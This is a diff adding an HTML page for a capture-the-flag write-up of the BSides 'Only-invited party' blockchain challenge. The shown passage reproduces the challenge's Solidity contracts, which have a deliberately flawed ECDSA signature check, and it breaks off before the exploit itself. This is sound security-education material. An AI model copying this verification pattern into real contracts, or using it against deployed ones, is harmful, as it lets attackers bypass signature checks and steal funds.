@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Only-invited party - </title><meta name="description" content="Exploiting unchecked ecrecover return values and dirty memory in inline assembly to bypass signature verification and steal golden tickets."><meta property="og:url" content="http://localhost:1313/posts/bsides/indit/">
+  <meta property="og:title" content="Only-invited party">
+  <meta property="og:description" content="Exploiting unchecked ecrecover return values and dirty memory in inline assembly to bypass signature verification and steal golden tickets.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-12-24T00:00:00+00:00">
+    <meta property="article:tag" content="Blockchain">
+    <meta property="article:tag" content="Solidity">
+    <meta property="article:tag" content="Assembly">
+    <meta property="article:tag" content="Ecrecover">
+    <meta property="article:tag" content="Evm">
+    <meta property="og:image" content="http://localhost:1313/posts/bsides/indit/featured-image_hu_a44b4b44971bcb74.webp">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/posts/bsides/indit/featured-image_hu_a44b4b44971bcb74.webp">
+  <meta name="twitter:title" content="Only-invited party">
+  <meta name="twitter:description" content="Exploiting unchecked ecrecover return values and dirty memory in inline assembly to bypass signature verification and steal golden tickets.">
+<meta name="application-name" content="">
+<meta name="apple-mobile-web-app-title" content=""><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/bsides/indit/" /><link rel="prev" href="http://localhost:1313/posts/bsides/geni/" /><link rel="stylesheet" href="/css/page.min.css"><link rel="stylesheet" href="/css/home.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Only-invited party",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/bsides\/indit\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/posts\/bsides\/indit\/featured-image.webp",
+                            "width":  303 ,
+                            "height":  166 
+                        }],"genre": "posts","keywords": "blockchain, solidity, assembly, ecrecover, evm","wordcount":  2772 ,
+        "url": "http:\/\/localhost:1313\/posts\/bsides\/indit\/","datePublished": "2025-12-24T00:00:00+00:00","dateModified": "2025-12-24T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": "Koyphshi"},"author": {
+                "@type": "Person",
+                "name": "Koyphshi"
+            },"description": "Exploiting unchecked ecrecover return values and dirty memory in inline assembly to bypass signature verification and steal golden tickets."
+    }
+    </script></head><body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">Koyphshi</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/">
+                            Posts
+                        </a><a class="menu-item" href="/categories/">
+                            Categories
+                        </a><a class="menu-item" href="/tags/">
+                            tags
+                        </a><span class="menu-item delimiter"></span><a href="#" onclick="return false;" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fa-solid fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">Koyphshi</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/tags/" title="">tags</a><div class="menu-item"><a href="#" onclick="return false;" class="theme-switch" title="Switch Theme">
+                    <i class="fa-solid fa-adjust fa-fw"></i>
+                </a>
+            </div></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single" data-toc="enable"><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/bsides/indit/featured-image.webp"
+        data-srcset="/posts/bsides/indit/featured-image.webp, /posts/bsides/indit/featured-image.webp 1.5x, /posts/bsides/indit/featured-image.webp 2x"
+        data-sizes="auto"
+        alt="/posts/bsides/indit/featured-image.webp"
+        title="Exploiting unchecked ecrecover return values and dirty memory in inline assembly to bypass signature verification and steal golden tickets." /></div><div class="single-card" data-image="true"><h2 class="single-title animated flipInX">Only-invited party</h2><div class="post-meta">
+                <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><img
+        class="lazyload avatar"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.jpeg"
+        data-srcset="/images/avatar.jpeg, /images/avatar.jpeg 1.5x, /images/avatar.jpeg 2x"
+        data-sizes="auto"
+        alt="/images/avatar.jpeg"
+        title="/images/avatar.jpeg" /><span class="post-author-name">Koyphshi&nbsp;</span>
+                            </a></span><span class="post-category">published in <a href="/categories/ctf/"><i class="fa-regular fa-folder fa-fw"></i>Ctf</a></span></div>
+                <div class="post-meta-line"><span><i class="fa-regular fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2025-12-24">2025-12-24</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw"></i>&nbsp;2772 words</span>&nbsp;
+                    <span><i class="fa-regular fa-clock fa-fw"></i>&nbsp;14 minutes</span>&nbsp;</div>
+            </div>
+            
+            <hr><div class="details toc" id="toc-static"  data-kept="">
+                    <div class="details-summary toc-title">
+                        <span>Contents</span>
+                        <span><i class="details-icon fa-solid fa-angle-right"></i></span>
+                    </div>
+                    <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-overview">Challenge Overview</a></li>
+    <li><a href="#file-analysis">File Analysis</a>
+      <ul>
+        <li><a href="#1-partysol">1. Party.sol</a></li>
+        <li><a href="#2-ecdsasol">2. ECDSA.sol</a></li>
+        <li><a href="#3-setupsol">3. Setup.sol</a></li>
+      </ul>
+    </li>
+    <li><a href="#the-vulnerability-deep-dive">The Vulnerability Deep Dive</a>
+      <ul>
+        <li><a href="#understanding-ecrecover-precompile">Understanding ecrecover Precompile</a></li>
+        <li><a href="#the-critical-flaw-in-tryrecover">The Critical Flaw in tryRecover</a></li>
+        <li><a href="#why-this-works-evm-memory-persistence">Why This Works: EVM Memory Persistence</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation-strategy">Exploitation Strategy</a>
+      <ul>
+        <li><a href="#phase-1-unlocking-the-guardian">Phase 1: Unlocking the Guardian</a></li>
+        <li><a href="#phase-2-accumulating-tickets-ghost-balance-attack">Phase 2: Accumulating Tickets (Ghost Balance Attack)</a></li>
+        <li><a href="#phase-3-stealing-the-owners-ticket">Phase 3: Stealing the Owner&rsquo;s Ticket</a></li>
+      </ul>
+    </li>
+    <li><a href="#complete-exploit-implementation">Complete Exploit Implementation</a></li>
+    <li><a href="#deployment-and-execution">Deployment and Execution</a></li>
+    <li><a href="#why-each-step-is-necessary">Why Each Step is Necessary</a>
+      <ul>
+        <li><a href="#step-1-unlocking-is-required">Step 1: Unlocking is Required</a></li>
+        <li><a href="#step-2-multiple-tickets-required">Step 2: Multiple Tickets Required</a></li>
+        <li><a href="#step-3-zero-locked-eth-required">Step 3: Zero Locked ETH Required</a></li>
+      </ul>
+    </li>
+    <li><a href="#security-analysis-and-mitigation">Security Analysis and Mitigation</a>
+      <ul>
+        <li><a href="#the-root-cause">The Root Cause</a></li>
+        <li><a href="#proper-implementation">Proper Implementation</a></li>
+        <li><a href="#alternative-use-openzeppelin">Alternative: Use OpenZeppelin</a></li>
+      </ul>
+    </li>
+    <li><a href="#key-takeaways">Key Takeaways</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav></div>
+                </div><div class="content" id="content"><div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fa-solid fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fa-solid fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ul>
+<li><strong>CTF</strong>: BSides</li>
+<li><strong>Challenge</strong>: Only-invited party</li>
+<li><strong>Category</strong>: Blockchain</li>
+<li><strong>Description</strong>: BSides Algiers are organizing a party and I didn&rsquo;t get invited. Can you kick the boss and invite me instead??</li>
+<li><strong>Author</strong>: 0xbrivan</li>
+<li><strong>Difficulty</strong>: Hard</li>
+</ul>
+</div>
+        </div>
+    </div>
+<h2 id="challenge-overview">Challenge Overview</h2>
+<p>The challenge presents a ticket-based party system where:</p>
+<ul>
+<li>The <strong>owner</strong> (boss) holds the first &ldquo;Golden Ticket&rdquo;</li>
+<li>A <strong>Guardian</strong> contract controls access and validates all transactions</li>
+<li>Players must steal the owner&rsquo;s ticket and accumulate their own tickets</li>
+<li>All operations are protected by ECDSA signature verification</li>
+</ul>
+<p>The win condition requires:</p>
+<ol>
+<li>Owner&rsquo;s ticket balance = 0</li>
+<li>Player&rsquo;s ticket balance &gt; 1</li>
+<li>All locked ETH withdrawn (balance = 0)</li>
+</ol>
+<h2 id="file-analysis">File Analysis</h2>
+<p>The challenge provided a zip file containing the complete source code with the following structure:</p>
+<h3 id="1-partysol">1. Party.sol</h3>
+<p>This file contains <strong>two critical contracts</strong>:</p>
+<h4 id="guardian-contract">Guardian Contract</h4>
+<p>The gatekeeper contract that manages the party state:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Guardian</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IParty</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">market</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="k">public</span> <span class="n">locked</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">modifier</span> <span class="nf">onlyUnlocked</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">locked</span><span class="p">,</span> <span class="s">&#34;Party not started&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">startParty</span><span class="p">(</span><span class="kt">address</span> <span class="n">sponsor</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span> <span class="n">signature</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">locked</span><span class="p">,</span> <span class="s">&#34;Already started&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Verify sponsor is address(0) by checking all bytes
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="kt">bytes20</span><span class="p">(</span><span class="n">sponsor</span><span class="p">)[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Invalid sponsor&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Verify signature
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes32</span> <span class="n">hash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">sponsor</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">signer</span> <span class="o">=</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">tryRecover</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span> <span class="n">signature</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">signer</span> <span class="o">==</span> <span class="n">sponsor</span><span class="p">,</span> <span class="s">&#34;Invalid signature&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">locked</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">batchTransaction</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Order</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">orders</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">rs</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">ss</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">vs</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="n">onlyUnlocked</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Process batch ticket transfers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">orders</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">market</span><span class="p">.</span><span class="n">check</span><span class="p">(</span><span class="n">orders</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">rs</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">vs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="bsidesparty-contract">BSidesParty Contract</h4>
+<p>The main ERC721-like contract managing tickets:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">BSidesParty</span> <span class="k">is</span> <span class="n">IParty</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balances</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">uint256</span> <span class="o">=&gt;</span> <span class="kt">address</span><span class="p">)</span> <span class="k">public</span> <span class="n">ownerOf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">lockedETH</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">ticketCounter</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">guardian</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">buy</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;Ticket costs 1 ETH&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Already have ticket&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">ticketCounter</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ownerOf</span><span class="p">[</span><span class="n">ticketCounter</span><span class="p">]</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">lockedETH</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">tokenId</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">ownerOf</span><span class="p">[</span><span class="n">tokenId</span><span class="p">]</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;Not owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">lockedETH</span> <span class="o">&gt;=</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;Insufficient funds&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span><span class="o">--</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">delete</span> <span class="n">ownerOf</span><span class="p">[</span><span class="n">tokenId</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">lockedETH</span> <span class="o">-=</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">tokenId</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">ownerOf</span><span class="p">[</span><span class="n">tokenId</span><span class="p">]</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;Not owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span><span class="o">--</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="n">to</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ownerOf</span><span class="p">[</span><span class="n">tokenId</span><span class="p">]</span> <span class="o">=</span> <span class="n">to</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">check</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Order</span> <span class="n">calldata</span> <span class="n">order</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">rs</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">ss</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">vs</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">guardian</span><span class="p">,</span> <span class="s">&#34;Only guardian&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Verify host signature
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes32</span> <span class="n">hostHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">order</span><span class="p">.</span><span class="n">host</span><span class="p">.</span><span class="n">account</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">order</span><span class="p">.</span><span class="n">invited</span><span class="p">.</span><span class="n">account</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">order</span><span class="p">.</span><span class="n">values</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">hostSigner</span> <span class="o">=</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">tryRecover</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">hostHash</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint8</span><span class="p">(</span><span class="n">vs</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rs</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ss</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">hostSigner</span> <span class="o">==</span> <span class="n">order</span><span class="p">.</span><span class="n">host</span><span class="p">.</span><span class="n">account</span><span class="p">,</span> <span class="s">&#34;Invalid host signature&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Verify invited signature
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes32</span> <span class="n">invitedHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">order</span><span class="p">.</span><span class="n">invited</span><span class="p">.</span><span class="n">account</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">order</span><span class="p">.</span><span class="n">host</span><span class="p">.</span><span class="n">account</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">order</span><span class="p">.</span><span class="n">values</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">invitedSigner</span> <span class="o">=</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">tryRecover</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">invitedHash</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint8</span><span class="p">(</span><span class="n">vs</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rs</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ss</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">invitedSigner</span> <span class="o">==</span> <span class="n">order</span><span class="p">.</span><span class="n">invited</span><span class="p">.</span><span class="n">account</span><span class="p">,</span> <span class="s">&#34;Invalid invited signature&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Transfer ticket from host to invited
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">tokenId</span> <span class="o">=</span> <span class="n">order</span><span class="p">.</span><span class="n">values</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">ownerOf</span><span class="p">[</span><span class="n">tokenId</span><span class="p">]</span> <span class="o">==</span> <span class="n">order</span><span class="p">.</span><span class="n">host</span><span class="p">.</span><span class="n">account</span><span class="p">,</span> <span class="s">&#34;Host doesn&#39;t own ticket&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="n">order</span><span class="p">.</span><span class="n">host</span><span class="p">.</span><span class="n">account</span><span class="p">]</span><span class="o">--</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">balances</span><span class="p">[</span><span class="n">order</span><span class="p">.</span><span class="n">invited</span><span class="p">.</span><span class="n">account</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ownerOf</span><span class="p">[</span><span class="n">tokenId</span><span class="p">]</span> <span class="o">=</span> <span class="n">order</span><span class="p">.</span><span class="n">invited</span><span class="p">.</span><span class="n">account</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="2-ecdsasol">2. ECDSA.sol</h3>
+<p><strong>This is where the vulnerability lives.</strong> A custom implementation of ECDSA signature recovery using inline assembly:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">library</span> <span class="n">ECDSA</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">tryRecover</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="n">hash</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint8</span> <span class="n">v</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="n">r</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="n">s</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">internal</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">result</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">assembly</span> {
+</span></span><span class="line"><span class="cl">            <span class="c1">// Prepare memory for ecrecover call
